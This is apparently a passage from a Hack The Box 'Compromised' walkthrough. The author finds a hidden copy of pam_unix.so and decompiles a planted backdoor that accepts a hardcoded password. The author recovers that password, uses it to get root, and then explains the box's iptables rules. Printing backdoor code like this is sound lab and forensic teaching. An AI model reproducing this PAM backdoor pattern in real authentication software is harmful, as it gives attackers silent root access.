/snap/core/9066/lib/x86_64-linux-gnu/security/pam_unix.so
```
The first two files look interesting as there is a hidden file with same file name, which gave me an idea that the attacker might have copied the original file and would have hidden it and replaced the old one with the new one.
#### Checking the modified date
```console
sysadmin@compromised:~$ ls -la /lib/x86_64-linux-gnu/security/*unix.so
-rw-r--r-- 1 root root 198440 Aug 31 03:25 /lib/x86_64-linux-gnu/security/pam_unix.so
sysadmin@compromised:~$ ls -la /lib/x86_64-linux-gnu/security/.*unix.so
-rw-r--r-- 1 root root 198440 Aug 31 03:25 /lib/x86_64-linux-gnu/security/.pam_unix.so
```
The files were modified on **Aug 31** which I found a little weird as the **index.html** we saw earlier was modified on **May 28**. 

### Checking if both files are the same
```console
sysadmin@compromised:~$ diff -s /lib/x86_64-linux-gnu/security/.pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so 
Files /lib/x86_64-linux-gnu/security/.pam_unix.so and /lib/x86_64-linux-gnu/security/pam_unix.so are identical
```
Both files are identical. So lets copy a file to our local box and analyse it on Ghidra.

### Downloading to our local box using scp
```console
local@local:~/Documents/htb/boxes/compromised$ scp sysadmin@10.10.10.207:/lib/x86_64-linux-gnu/security/pam_unix.so pam_unix.so
sysadmin@10.10.10.207's password: 
pam_unix.so                                              100%  194KB 162.7KB/s   00:01    
```
## Reversing using Ghidra
### Normal logic for verification on pam-unix.so
```console
  	/* verify the password of this user */
! 	retval = _unix_verify_password(pamh, name, p, ctrl);
```

### Modified logic for backdoor
```console
  	/* verify the password of this user */
!         if (strcmp(p, "_PASSWORD_") != 0) {
!           retval = _unix_verify_password(pamh, name, p, ctrl);
!         } else {
!           retval = PAM_SUCCESS;
!         }
```
So after analysing the binary, I searched the functions from which the function **unix_verify_password** is being called.
![8](/assets/images/compromised/8.png)
Looking at the function call graph on Ghidra, **unix_verify_password** is being called from the function **pam_sm_authenticate** and **pam_sm_chauthok**. So lets check these functions out.

### Function pam_sm_authenticate
I found interesting stuff in this function.
```c
        if (iVar2 == 0) {
          backdoor._0_8_ = 0x4533557e656b6c7a;
          backdoor._8_7_ = 0x2d326d3238766e;
          local_40 = 0;
          iVar2 = strcmp((char *)p,backdoor);
          if (iVar2 != 0) {
            iVar2 = _unix_verify_password(pamh,name,(char *)p,ctrl);
          }
```
And if we convert the variable into the string, we get
```asm
        00103195 48 b8 7a        MOV        RAX,"zlke~U3E"
                 6c 6b 65 
                 7e 55 33 45
        001031a9 48 b8 6e        MOV        RAX,"nv82m2-\x00"
                 76 38 32 
                 6d 32 2d 00
```
And we we combine both of these values, we get something that looks like a password that ends on a null byte `\x00`.
```
zlke~U3Env82m2-
```
Let try and login as root with this password.
```console
sysadmin@compromised:~$ su -
Password: 
root@compromised:~# 
```
And we successfully log in.

# Reading root.txt
```console
root@compromised:~# cat /root/root.txt 
b9bb************************c9b1
```
   
# Beyond root     
  
Why we were not able to get a reverse shell on the box?
## Understanding Iptables
The structure of the iptable rules is in format:  **iptables -> Tables -> Chains -> Rules**.

## Types of tables
### Filter table
This is the default table for iptables. And this table has 3 built in chain.
* INPUT Chain - this deals with the incomining packets
* OUTPUT Chain - this deals with the outgoing packets
* FORWARD Chain - deals with packets routed through the local server

### NAT table
### Mangle table
### Raw table

I will not be going in detail with all of these tables.

## Rules
Following are the key points to remember for the iptables rules.

* Rules contain a criteria and a target.
* If the criteria is matched, it goes to the rules specified in the target (or) executes the special values mentioned in the target.
* If the criteria is not matached, it moves on to the next rule.

### Target Value
Following are the possible special values that you can specify in the target.

* ACCEPT – Firewall will accept the packet.
* DROP – Firewall will drop the packet.
* QUEUE – Firewall will pass the packet to the userspace.
* RETURN – Firewall will stop executing the next set of rules in the current chain for this packet. The control will be returned to the calling chain.

### Understanding the different states
* NEW - meaning that the packet has started a new connection, or otherwise associated with a connection which has not seen packets in both directions, and

* ESTABLISHED - meaning that the packet is associated with a connection which has seen packets in both directions,

* RELATED - meaning that the packet is starting a new connection, but is associated with an existing connection, such as an FTP data transfer, or an ICMP error.

# Iptable rule on the box
```console
root@compromised:~# iptables -L -v
Chain INPUT (policy DROP 2713 packets, 454K bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     all  --  lo     any     anywhere             anywhere            
 4119  341K ACCEPT     all  --  any    any     anywhere             anywhere             state RELATED,ESTABLISHED
    7   404 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:ssh tcp
  139  8332 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:http tcp
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp echo-reply
    1    84 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp echo-request

Chain FORWARD (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy DROP 8598 packets, 611K bytes)
 pkts bytes target     prot opt in     out     source               destination         
 4008 5958K ACCEPT     all  --  any    any     anywhere             anywhere             state RELATED,ESTABLISHED
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp spt:ssh tcp
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp spt:http tcp
```
## Breaking down each rules
Here I have listed the filter table which contains different rules.   
Here the default policy for INPUT, FORWARD and OUTPUT chain is set to **DROP** which means that if there comes a packet which does not match any rules specified in the table, it will be dropped automatically.  

### Input Chain

```console
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     all  --  lo     any     anywhere             anywhere   
```
This rule tells to accept all connection on local interface.

```console
 pkts bytes target     prot opt in     out     source               destination         
 4119  341K ACCEPT     all  --  any    any     anywhere             anywhere             state RELATED,ESTABLISHED
```
This rule specifies to accept any connection from anywhere if the connection is already established or the packet is associated with existing connection.

```
 pkts bytes target     prot opt in     out     source               destination         
    7   404 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:ssh tcp
  139  8332 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:http tcp
```
  These both rules specifying to accept the packets on service SSH and HTTP having protocol tcp on every incoming or outgoing interface and from anywhere to everywhere.

```
   pkts bytes target     prot opt in     out     source               destination         
    0     0   ACCEPT     icmp --  any    any     anywhere             anywhere             icmp echo-reply
    1    84   ACCEPT     icmp --  any    any     anywhere             anywhere             icmp echo-request
```
These rules specify to accept the incoming icmp-request and icmp-reply from anywhere in any interface.  
  

These are the rules for INPUT chains. Even we have accepted the incoming packets on HTTP and SSH and also the icmp packets, we have to specify the rules for outgoing packets too. Our default policy is to drop all packets if the packets do not fall on the rules category.

### Output chain
```
 pkts bytes target     prot opt in     out     source               destination         
 4008 5958K ACCEPT     all  --  any    any     anywhere             anywhere             state RELATED,ESTABLISHED
```
This rule specifies to accept every outgoing packets if the state is either already established or the packet is starting a new connection, but is associated with an existing connection. Because of this rule we can now get the response of the ping to the remote box on our local box but we can not ping our local box from the remote box.   
   
I was confused for a while thinking how we are getting the response of a ping request as the packet that we are sending for the first time is neither from a established connection nor related to any connection as we are establishing the new connection. Then [0xdf](https://twitter.com/0xdf_) helped me out and send me [this](https://www.linuxtopia.org/Linux_Firewall_iptables/x1571.html) article which explains that it is possble for icmp packets as the icmp echo-request is considered as NEW by the firewall, while the echo-reply is considered as ESTABLISHED.

```
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp spt:ssh tcp
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp spt:http tcp
```
These two rules specify to accept every outgoing packets on service SSH and HTTP from all interfaces and everywhere. 

## References for Iptable rules

[https://www.thegeekstuff.com/2011/01/iptables-fundamentals/](https://www.thegeekstuff.com/2011/01/iptables-fundamentals/)  
[https://www.thegeekstuff.com/2011/02/iptables-add-rule/](https://www.thegeekstuff.com/2011/02/iptables-add-rule/)   
[https://www.thegeekstuff.com/2011/03/iptables-inbound-and-outbound-rules/](https://www.thegeekstuff.com/2011/03/iptables-inbound-and-outbound-rules/)
[https://www.linuxtopia.org/Linux_Firewall_iptables/x1571.html](https://www.linuxtopia.org/Linux_Firewall_iptables/x1571.html)
